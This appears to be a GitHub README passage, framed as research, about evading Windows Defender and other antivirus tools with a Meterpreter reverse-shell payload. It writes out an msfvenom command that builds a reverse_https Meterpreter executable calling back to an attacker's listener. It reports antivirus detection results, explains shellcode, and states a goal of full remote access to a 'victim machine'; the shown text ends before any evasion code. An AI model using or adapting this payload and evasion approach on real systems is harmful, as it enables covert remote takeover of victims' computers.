# Windows Security Evasion, for research porpose

Malicious software that is running a reverse shell, to get full access remote to the victim machine and this software can easily bypass windows security / windows defender and others AV's, up to now (01/04/2022).


# Anti-Virus Evasion Research

I wanted to bypass the Windows Security Virus &amp; Threat Protection with some meterpreter malware that gives me access of the victim shell, so with I could get a reverse shell.

So I tried the vanilla version of the meterpreter that you can easily forge from msfvenom:

```msfvenom -p windows/x64/meterpreter/reverse\_https LHOST=eth0 LPORT=4444 -f exe -o test\_exploit.exe```

With that I uploaded this piece of software that is executable for windows and it contains our malware vanilla (PE32+ executable (GUI) x86-64, for MS Windows). 

![](https://github.com/xbeatzsec/windows-security-evasion/blob/main/not_clean_vanilla.png)

As you can see it has been detected as a malware in 19 differents anti-virus, but this is not too good, because even a vanilla version of a malware can bypass or can be undetected in some anti-virus softwares in the market.

But our target (Windows Defewnder) detected it as a &quot;Trojan:Win64/Meterpreter.D&quot;, so we can play around with our payload and try to bypass, this is my mission during this research.

So in msfvenom we could create a exe file to run in windows system, but also we can create a payload from that software to create a shellcode containing the malware that we want to run in the victim system with windows defender running.

Shellcodes are pieces of machine code designed to run local or remote system shell (hence the name). They are mainly used during exploitation of software vulnerabilities - when an attacker is able to control program&#39;s execution flow he needs some universal payload to execute desired action (usually shell access). This applies to both local exploitation (e.g. for privilege escalation) and remote exploitation (for gaining RCE on a server).

But first let&#39;s use Win32 API that is built into Windows, and that is an application programmig interface written in C by Microsoft to allow access to Windows features.
